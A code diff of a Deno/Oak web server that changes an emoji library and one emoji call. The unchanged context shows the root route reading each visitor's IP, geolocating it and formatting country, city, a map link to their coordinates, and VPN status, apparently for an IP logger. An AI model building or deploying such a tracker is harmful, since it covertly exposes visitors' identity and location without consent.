@@ -1,7 +1,7 @@
 import { Application, Router } from "https://deno.land/x/oak/mod.ts";
 import userAgent from 'https://deno.land/x/user_agent@v0.1.4/mod.ts';
 import ipapi from 'https://deno.land/x/ipapi/mod.js'
-import * as emoji from "https://deno.land/x/emoji/mod.ts";
+import { getEmojiByName } from "https://deno.land/x/getmoji@1.2.4/mod.ts";
 
 const app = new Application();
 const router = new Router();
@@ -13,7 +13,7 @@ router.get("/", async (ctx) => {
   
   const ip = ctx.request.ip;
   const info = await ipapi(`${ip}`);
-  const countryinfo = encodeURIComponent(`**COUNTRY** : \`${info.country}\` `) + emoji.get("France");
+  const countryinfo = encodeURIComponent(`**COUNTRY** : \`${info.country}\` `) + await getEmojiByName("pizza");
   const cityInfo = encodeURIComponent(`**CITY** : \[${info.city}\]\(https://www.google.com/maps/search/?api=1&query=${info.lat}%2C${info.lon}\)`);
   const iptext = encodeURIComponent(`**IP** : \[${ip}\]\(https://ip2location.io/${ip}\)`);
   const vpn = encodeURIComponent(`**VPN** : \`${info.proxy}\``);
